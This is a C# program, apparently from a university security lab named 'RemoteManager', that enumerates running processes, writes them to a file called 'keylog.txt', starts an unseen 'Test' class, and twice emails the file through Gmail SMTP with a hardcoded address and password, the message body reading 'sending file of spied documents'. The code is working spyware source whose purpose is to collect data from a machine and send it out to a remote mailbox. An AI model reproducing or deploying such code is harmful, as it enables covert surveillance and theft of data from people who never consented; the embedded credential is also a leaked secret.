using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using WQLUtil.Util.ProcessEx;
using System.Management;
using System.Windows.Forms;
//Para manejo de archivo
using System.IO;
//Para correo
using System.Net.Mail;

namespace Pruebas
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
           
            
            List<Process> process = ProcessManager.GetAllProcess();
            //String fileName = @"C:\Users\Roci\Maestría\Fundamentos de Seguridad\Lab10 - RemoteManager\Pruebas\bin\Debug";
            String fileName = "keylog.txt";
            //@"C:\Users\Roci\Maestría\Fundamentos de Seguridad\Lab10 - RemoteManager\Pruebas\bin\Debug"
            FileStream stream;
            StreamWriter writer;
            //List<Process> process = ProcessManager.GetAllProcessByHost("SERVKEY-XPS","servkey","****");
            stream = new FileStream(fileName, FileMode.OpenOrCreate, FileAccess.Write);
            writer = new StreamWriter(stream);
           
            foreach(Process p in process){
                Console.Write("ProcessId: {0}, ", p.ProcessId);
                Console.Write("Name: {0}, ", p.Name);
                Console.Write("Priority: {0}, ", p.Priority);
                Console.Write("Status: {0}, ", p.Status);
                Console.Write("ThreadCount: {0}, ", p.ThreadCount);
                Console.Write("Handle: {0}, ", p.Handle);
                Console.WriteLine("OSName: {0}", p.OSName);

                writer.WriteLine("ProcessId: {0}, ", p.ProcessId);
                writer.WriteLine("Name: {0}, ", p.Name);
                writer.WriteLine("Priority: {0}, ", p.Priority);
                writer.WriteLine("Status: {0}, ", p.Status);
                writer.WriteLine("ThreadCount: {0}, ", p.ThreadCount);
                writer.WriteLine("Handle: {0}, ", p.Handle);
                writer.WriteLine("OSName: {0}", p.OSName);
              }
            writer.Close();
            stream.Close();

            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("funseguridad@gmail.com");
                mail.To.Add("funseguridad@gmail.com");
                mail.Subject = "Hola";

                mail.Body = "Enviando archivo de documentos espiados";
                System.Net.Mail.Attachment attachment;
                attachment = new System.Net.Mail.Attachment(fileName);
                mail.Attachments.Add(attachment);
                SmtpServer.Port = 587;

                SmtpServer.DeliveryMethod = SmtpDeliveryMethod.Network;
                //SmtpServer.UseDefaultCredentials = false;
                String pass = "123EjemplO";
                SmtpServer.Credentials = new System.Net.NetworkCredential("funseguridad@gmail.com", pass);
                SmtpServer.EnableSsl = true;
                SmtpServer.Send(mail);
                MessageBox.Show("mail Send");
                mail.Attachments.Dispose();
                Console.WriteLine("termino correo");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            } 
           // return;
           writer.Close();
           //stream.Flush();
           stream.Close();

           //stream.Unlock(textLength - 1, byteCount); 
           Test t = new Test();
           System.Windows.Forms.Application.Run();
           try
           {
               MailMessage mail = new MailMessage();
               SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

               mail.From = new MailAddress("funseguridad@gmail.com");
               mail.To.Add("funseguridad@gmail.com");
               mail.Subject = "Hola";

               mail.Body = "Enviando archivo de documentos espiados 2";
               System.Net.Mail.Attachment attachment;
               attachment = new System.Net.Mail.Attachment(fileName);
               mail.Attachments.Add(attachment);
               SmtpServer.Port = 587;

               SmtpServer.DeliveryMethod = SmtpDeliveryMethod.Network;
               //SmtpServer.UseDefaultCredentials = false;
               String pass = "123EjemplO";
               SmtpServer.Credentials = new System.Net.NetworkCredential("funseguridad@gmail.com", pass);
               SmtpServer.EnableSsl = true;
               SmtpServer.Send(mail);
               MessageBox.Show("mail Send");
               mail.Attachments.Dispose();
               Console.WriteLine("termino correo");
           }
           catch (Exception ex)
           {
               MessageBox.Show(ex.ToString());
           } 
                  
            //writer.Close();   
         }      
    }
}
